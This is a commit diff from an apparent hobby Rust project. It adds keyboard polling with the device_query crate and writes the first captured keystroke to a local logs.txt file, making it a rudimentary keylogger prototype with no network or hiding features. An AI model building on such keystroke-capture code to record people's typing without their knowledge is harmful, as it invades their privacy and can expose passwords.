5b74ae195d40715e058652219335fea7d5d566e4
SpicyGengu <lovro.antic1@gmail.com>
2025-02-13 18:01:31 +0100

    key tracking implemented
    one at a time tho

--- src/main.rs
+++ src/main.rs
@@ -1,6 +1,7 @@
 use std::fs::{self, File};
 use std::time::{Duration, Instant};
 use std::io::prelude::*;
+use device_query::{DeviceQuery, DeviceState, Keycode};
 
 fn write_to_file(path: &str, contents: &str) -> Result<(), Box<dyn std::error::Error>> {
     fs::write(&path, &contents)?;
@@ -9,14 +10,19 @@ fn write_to_file(path: &str, contents: &str) -> Result<(), Box<dyn std::error::E
 
 fn main() {
     let file_name: &str = "logs.txt";
-    let mut log_content: &str = "now look at this";
-    let mut log_content_addon: &str = "\nstrong or smtn";
-    match write_to_file(&file_name, &log_content) {
-        Ok(_) => (),
-        Err(_) => println!("couldn't write to file")
+    let mut log_content = String::from("Wow:");
+    let mut log_content_addon = String::from("");
+    let device_state = DeviceState::new();
+
+    loop {
+        let keys: Vec<Keycode> = device_state.get_keys();
+        if !keys.is_empty(){
+            log_content_addon = keys[0].to_string().to_lowercase();
+            break;
+        }
     }
-    let binding = (log_content.to_owned() + log_content_addon);
-    log_content = binding.as_str();
+    log_content = log_content.to_owned() + &log_content_addon;
+    
     match write_to_file(&file_name, &log_content) {
         Ok(_) => (),
         Err(_) => println!("couldn't write to file")
